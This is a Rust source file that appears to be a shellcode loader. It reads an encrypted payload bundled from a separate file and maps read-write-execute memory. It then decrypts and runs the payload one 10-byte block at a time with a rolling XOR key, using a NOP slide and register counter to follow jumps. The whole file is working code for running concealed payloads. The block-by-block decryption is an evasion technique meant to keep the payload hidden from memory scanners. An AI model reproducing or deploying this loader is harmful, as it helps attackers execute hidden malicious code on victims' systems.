use std::{
    alloc::{alloc, Layout},
    arch::asm,
};

use libc::{mprotect, PROT_EXEC, PROT_READ, PROT_WRITE, _SC_PAGESIZE};

const BLOCK_SIZE: usize = 10;
const SHELLCODE: &[u8] = include_bytes!("../shellcode_raw_encrypted");
const SHELLCODE_LEN: usize = SHELLCODE.len() / BLOCK_SIZE;
const MAX_JUMP: usize = 0xbb;
const SLIDE_LEN: usize = MAX_JUMP.div_ceil(BLOCK_SIZE);

const FIRST_SLIDE: [u8; 10] = [
    0x49, 0xC7, 0xC5, 0x01, 0x00, 0x00, 0x00, // mov r13, 1
    0x90, // nop
    0x90, // nop
    0x90, // nop
];

const SLIDE: [u8; 10] = [
    0x49, 0x83, 0xC5, 0x01, // add r13, 0x1
    0x90, // nop
    0x90, // nop
    0x90, // nop
    0x90, // nop
    0x90, // nop
    0x90, // nop
];

const MAX_STACK: usize = 64;
const CATCH_LEN: usize = 1;

const ALLOC_SIZE: usize =
    SHELLCODE_LEN + FIRST_SLIDE.len() + SLIDE_LEN * BLOCK_SIZE + CATCH_LEN + MAX_STACK;
const CATCH_OFFSET: usize = BLOCK_SIZE + FIRST_SLIDE.len() + SLIDE_LEN * BLOCK_SIZE;
const STACK_OFFSET: usize = BLOCK_SIZE + FIRST_SLIDE.len() + SLIDE_LEN * BLOCK_SIZE + CATCH_LEN;

const KEY: [u8; BLOCK_SIZE] = [0x9f, 0x96, 0xd1, 0xef, 0x3a, 0x79, 0x98, 0x29, 0x9e, 0x8a];

fn main() {
    unsafe {
        let page_size = page_size::get();
        let ptr = alloc(Layout::from_size_align(ALLOC_SIZE, page_size).unwrap());
        mprotect(
            ptr.cast(),
            _SC_PAGESIZE as _,
            PROT_READ | PROT_WRITE | PROT_EXEC,
        );

        let slice = core::slice::from_raw_parts_mut(ptr, STACK_OFFSET);

        // setup slide
        slice[BLOCK_SIZE..(BLOCK_SIZE * 2)].copy_from_slice(&FIRST_SLIDE); // ret
        for i in 2..(SLIDE_LEN + 2) {
            let start = i * BLOCK_SIZE;
            let end = start + BLOCK_SIZE;
            slice[start..end].copy_from_slice(&SLIDE);
        }

        slice[CATCH_OFFSET] = 0xc3; // ret

        let stack_ptr = ptr.add(STACK_OFFSET);

        let mut rax: u64 = 0;
        let mut rdi: u64 = 0;
        let mut rsi: u64 = 0;
        let mut rdx: u64 = 0;
        let mut r14: u64 = 0;
        let r15 = stack_ptr;

        let mut instr_pointer = 0;

        loop {
            let chunk = &SHELLCODE
                .chunks_exact(BLOCK_SIZE)
                .nth(instr_pointer)
                .unwrap();

            let key = KEY;
            for i in 0..BLOCK_SIZE {
                slice[i] = chunk[i] ^ (key[i].wrapping_add(instr_pointer as u8));
            }

            let mut r13: u64 = 0;

            asm!(
                "call {0}",
                "cld", // clear direction flag
                in(reg) ptr,
                inout("rax") rax,
                out("rcx") _,
                inout("rdx") rdx,
                inout("rdi") rdi,
                inout("rsi") rsi,
                inout("r14") r14,
                inout("r13") r13,
                in("r15") r15,
                clobber_abi("C")
            );

            instr_pointer += (SLIDE_LEN + 2) - r13 as usize;
        }
    }
}
